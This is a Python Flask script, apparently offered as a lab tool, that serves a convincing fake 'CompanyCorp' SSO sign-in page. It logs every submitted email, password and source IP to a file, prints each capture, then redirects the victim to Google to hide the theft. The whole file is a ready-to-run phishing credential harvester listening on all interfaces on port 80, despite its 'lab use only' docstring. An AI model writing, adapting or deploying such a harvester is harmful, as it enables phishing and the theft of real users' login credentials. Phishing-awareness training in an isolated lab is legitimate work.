#!/usr/bin/env python3
"""
phish.py — Fake SSO login page for credential harvesting
Lab use only. Isolated host-only network (192.168.56.0/24).
"""

from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)
CREDS_FILE = "creds.txt"

LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Company SSO — Sign In</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f3f4f6;
            display: flex; align-items: center; justify-content: center;
            min-height: 100vh;
        }
        .card {
            background: white; border-radius: 8px;
            box-shadow: 0 2px 16px rgba(0,0,0,0.10);
            padding: 48px 40px 40px; width: 380px;
        }
        .logo { font-size: 22px; font-weight: 700; color: #1a56db; margin-bottom: 8px; }
        h1 { font-size: 20px; color: #111; margin-bottom: 24px; }
        label { display: block; font-size: 13px; color: #374151; margin-bottom: 4px; }
        input[type=text], input[type=password] {
            width: 100%; padding: 10px 12px;
            border: 1px solid #d1d5db; border-radius: 6px;
            font-size: 14px; margin-bottom: 16px; outline: none;
            transition: border-color 0.2s;
        }
        input:focus { border-color: #1a56db; }
        button {
            width: 100%; background: #1a56db; color: white;
            border: none; border-radius: 6px; padding: 11px;
            font-size: 15px; cursor: pointer; font-weight: 600;
        }
        button:hover { background: #1448c4; }
        .footer { margin-top: 20px; font-size: 12px; color: #9ca3af; text-align: center; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">🏢 CompanyCorp</div>
    <h1>Sign in to your account</h1>
    <form method="POST" action="/">
        <label for="username">Work email</label>
        <input type="text" id="username" name="username"
               placeholder="you@company.local" autocomplete="email" required>
        <label for="password">Password</label>
        <input type="password" id="password" name="password"
               placeholder="••••••••" autocomplete="current-password" required>
        <button type="submit">Sign in</button>
    </form>
    <div class="footer">Protected by CompanyCorp SSO · v3.2.1</div>
</div>
</body>
</html>
"""

SUCCESS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Redirecting…</title>
    <meta http-equiv="refresh" content="3;url=https://www.google.com">
    <style>
        body { font-family: sans-serif; display:flex; align-items:center;
               justify-content:center; min-height:100vh; background:#f3f4f6; }
        .msg { text-align:center; color:#374151; }
    </style>
</head>
<body>
<div class="msg"><p>⏳ Signing you in… please wait.</p></div>
</body>
</html>
"""


@app.route("/", methods=["GET"])
def index():
    return render_template_string(LOGIN_PAGE)


@app.route("/", methods=["POST"])
def capture():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    src_ip   = request.remote_addr
    ts       = datetime.now()

    entry = f"[{ts}] IP={src_ip} USER={username} PASS={password}\n"
    with open(CREDS_FILE, "a") as f:
        f.write(entry)

    print(f"[+] CAPTURED  {entry.strip()}")
    return render_template_string(SUCCESS_PAGE)


if __name__ == "__main__":
    print("[*] Phishing server starting on 0.0.0.0:80")
    print(f"[*] Credentials will be saved to: {CREDS_FILE}")
    print("[*] Press Ctrl+C to stop\n")
    app.run(host="0.0.0.0", port=80, debug=False)
